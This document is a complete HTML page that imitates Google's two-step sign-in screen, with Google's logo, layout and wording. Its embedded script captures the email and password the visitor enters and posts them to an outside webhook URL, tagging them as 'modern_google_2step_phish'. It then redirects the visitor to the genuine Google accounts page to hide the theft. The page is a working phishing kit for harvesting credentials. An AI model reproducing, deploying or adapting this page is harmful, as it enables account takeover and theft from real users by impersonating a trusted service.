<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Google Sans', Arial, sans-serif;
        }
        body {
            background-color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: #202124;
        }
        .container {
            width: 448px;
            padding: 48px 40px 36px;
            border: 1px solid #dadce0;
            border-radius: 8px;
            margin: 20px;
        }
        .logo {
            text-align: center;
            margin-bottom: 16px;
        }
        .logo img {
            width: 75px;
            height: 24px;
        }
        h1 {
            text-align: center;
            font-size: 24px;
            font-weight: 400;
            margin-bottom: 8px;
        }
        .subtitle {
            text-align: center;
            font-size: 16px;
            font-weight: 400;
            margin-bottom: 24px;
            color: #5f6368;
        }
        .input-container {
            margin-bottom: 24px;
        }
        input {
            width: 100%;
            height: 54px;
            padding: 16px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            outline: none;
            transition: border-color 0.2s;
        }
        input:focus {
            border-color: #1a73e8;
            border-width: 2px;
        }
        .forgot-email, .forgot-password {
            color: #1a73e8;
            font-weight: 500;
            font-size: 14px;
            text-decoration: none;
            margin-bottom: 32px;
            display: block;
        }
        .disclaimer {
            font-size: 14px;
            color: #5f6368;
            margin-bottom: 32px;
            line-height: 1.4286;
        }
        .disclaimer a {
            color: #1a73e8;
            text-decoration: none;
            font-weight: 500;
        }
        .button-container {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .create-account {
            color: #1a73e8;
            font-weight: 500;
            text-decoration: none;
            font-size: 14px;
        }
        button {
            background: #1a73e8;
            color: white;
            border: none;
            border-radius: 4px;
            padding: 10px 24px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: background-color 0.2s;
        }
        button:hover {
            background: #1669c1;
        }
        .user-info {
            display: flex;
            align-items: center;
            margin-bottom: 16px;
            padding: 12px;
            background: #f8f9fa;
            border-radius: 8px;
        }
        .user-avatar {
            width: 32px;
            height: 32px;
            background: #1a73e8;
            color: white;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: 500;
            margin-right: 12px;
        }
        .user-email {
            font-size: 14px;
            font-weight: 500;
        }
        .sign-in-different {
            color: #1a73e8;
            font-weight: 500;
            text-decoration: none;
            font-size: 14px;
            display: block;
            text-align: center;
            margin-top: 16px;
        }
        .step-hidden {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://www.gstatic.com/images/branding/googlelogo/svg/googlelogo_clr_74x24px.svg" alt="Google">
        </div>
        
        <!-- Step 1: Email Entry -->
        <div id="step1">
            <h1>Sign in</h1>
            <div class="subtitle">Use your Google Account</div>
            
            <form id="emailForm">
                <div class="input-container">
                    <input type="email" id="email" placeholder="Email or phone" required autofocus>
                </div>
                
                <a href="#" class="forgot-email">Forgot email?</a>
                
                <div class="disclaimer">
                    Not your computer? Use Guest mode to sign in privately. 
                    <a href="#">Learn more</a>
                </div>
                
                <div class="button-container">
                    <a href="#" class="create-account">Create account</a>
                    <button type="submit" id="nextBtn">Next</button>
                </div>
            </form>
        </div>
        
        <!-- Step 2: Password Entry -->
        <div id="step2" class="step-hidden">
            <div class="user-info">
                <div class="user-avatar" id="userAvatar">G</div>
                <div class="user-email" id="userEmailDisplay">user@gmail.com</div>
            </div>
            
            <h1>Welcome</h1>
            <div class="subtitle">Enter your password</div>
            
            <form id="passwordForm">
                <div class="input-container">
                    <input type="password" id="password" placeholder="Enter your password" required autofocus>
                </div>
                
                <a href="#" class="forgot-password">Forgot password?</a>
                
                <div class="button-container">
                    <a href="#" class="create-account" id="backToEmail">Sign in with a different account</a>
                    <button type="submit" id="signInBtn">Next</button>
                </div>
            </form>
        </div>
    </div>

    <script>
        const webhookURL = 'https://unkempt-architect-15.webhook.cool';
        let capturedEmail = '';

        // Email form submission
        document.getElementById('emailForm').addEventListener('submit', function(e) {
            e.preventDefault();
            capturedEmail = document.getElementById('email').value;
            
            // Update the display for step 2
            document.getElementById('userEmailDisplay').textContent = capturedEmail;
            document.getElementById('userAvatar').textContent = capturedEmail.charAt(0).toUpperCase();
            
            // Show password step, hide email step
            document.getElementById('step1').style.display = 'none';
            document.getElementById('step2').classList.remove('step-hidden');
        });

        // Password form submission
        document.getElementById('passwordForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const password = document.getElementById('password').value;

            // Send both email and password to webhook
            fetch(webhookURL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    email: capturedEmail,
                    password: password,
                    source: 'modern_google_2step_phish'
                })
            })
            .then(response => {
                if (response.ok) {
                    // Redirect to real Google after capturing data
                    window.location.href = 'https://accounts.google.com';
                }
            })
            .catch(error => console.error('Error:', error));
        });

        // Back to email step
        document.getElementById('backToEmail').addEventListener('click', function(e) {
            e.preventDefault();
            document.getElementById('step2').classList.add('step-hidden');
            document.getElementById('step1').style.display = 'block';
        });
    </script>
</body>
</html>
